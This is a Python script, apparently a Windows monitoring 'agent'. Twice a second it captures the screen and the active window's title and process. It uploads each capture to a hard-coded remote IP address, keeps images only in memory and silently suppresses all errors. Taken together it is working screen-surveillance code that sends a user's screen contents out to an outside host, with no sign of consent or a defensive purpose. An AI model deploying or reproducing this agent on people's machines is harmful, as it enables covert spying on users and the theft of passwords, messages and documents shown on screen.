import time
import io
import socket
import psutil
import requests
import traceback

# Screenshot support
try:
    from PIL import ImageGrab
except:
    ImageGrab = None

import win32gui
import win32process

SERVER_URL = "http://88.222.221.40:5050/upload"
UPLOAD_TOKEN = "BURAYA_SERVER_ENV_UPLOAD_TOKEN_YAZILACAQ"
REQUEST_TIMEOUT = 10
JPEG_QUALITY = 40
PC_NAME = socket.gethostname()
# 0.5 saniyəlik interval (saniyədə 2 dəfə)
INTERVAL_SECONDS = 0.5 

# =========================
#  UNIVERSAL SCREENSHOT
# =========================
def take_screenshot():
    try:
        if ImageGrab:
            return ImageGrab.grab()
        else:
            import pyscreenshot as ImageShot
            return ImageShot.grab()
    except Exception:
        try:
            import pyscreenshot as ImageShot
            return ImageShot.grab()
        except:
            return None

# =========================
#   ACTIVE WINDOW
# =========================
def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd == 0:
            return None, None
        title = win32gui.GetWindowText(hwnd)
        tid, pid = win32process.GetWindowThreadProcessId(hwnd)
        try:
            proc = psutil.Process(pid).name()
        except:
            proc = "UNKNOWN"
        return title, proc
    except:
        return None, None

# =========================
#   SEND (RAM BASED)
# =========================
def send_screenshot():
    img = take_screenshot()
    if img is None:
        return

    # Şəkli birbaşa RAM-a (BytesIO) yazırıq
    buf = io.BytesIO()

    try:
        img.save(buf, format="JPEG", quality=JPEG_QUALITY)
        buf.seek(0)

        active_title, active_process = get_active_window_info()

        data = {
            "pc_name": PC_NAME,
            "active_window": active_title or "",
            "active_process": active_process or "",
        }

        files = {"screenshot": ("screen.jpg", buf, "image/jpeg")}

        headers = {
            "X-Upload-Token": UPLOAD_TOKEN
        }

        requests.post(
            SERVER_URL,
            data=data,
            files=files,
            headers=headers,
            timeout=REQUEST_TIMEOUT
        )
    except:
        pass
    finally:
        buf.close()

# =========================
#   MAIN
# =========================
def main():
    print("Agent started (RAM-only mode) →", PC_NAME)
    while True:
        send_screenshot()
        time.sleep(INTERVAL_SECONDS)

if __name__ == "__main__":
    main()